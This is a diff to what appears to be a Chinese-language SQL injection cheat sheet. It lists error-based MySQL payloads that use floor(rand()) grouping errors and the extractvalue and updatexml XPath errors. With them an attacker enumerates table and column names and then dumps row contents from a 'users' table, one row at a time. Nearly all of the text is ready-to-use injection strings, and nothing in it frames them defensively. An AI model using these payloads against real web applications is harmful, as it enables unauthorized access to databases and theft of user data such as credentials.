@@ -13,6 +13,9 @@
 2. 获取数据表名（extractvalue XPath 报错）
 (1)'or (select 1 from (select count(*),concat(0x5e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a) or '（爆第一个表名）
 (2)'or (select 1 from (select count(*),concat(0x5e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a) or '（爆第二个表名）以此类推
-(3)' or extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema='XXXXXXXXX'),0x5c)) or '（爆所有表名）
+(3)' or extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema='数据库名'),0x5c)) or '（爆所有表名）
 3. 获取字段名（updatexml XPath 报错）
-(1)' or updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='XXXXXXXXXXXXXXXXX'),0x5e),1) or '
+(1)' or updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_name='表名' and table_schema='数据库名'),0x5e),1) or '
+4.获取字段内容
+(1)' or updatexml(1,concat(0x5e,(select concat(要爆的字段名字,':',要爆的字段名字) from users limit 0,1),0x5e),1) or ' （爆第一个字段里的内容）
+(2)' or updatexml(1,concat(0x5e,(select concat(要爆的字段名字,':',要爆的字段名字) from users limit 1,1),0x5e),1) or ' （爆第二个字段里的内容）
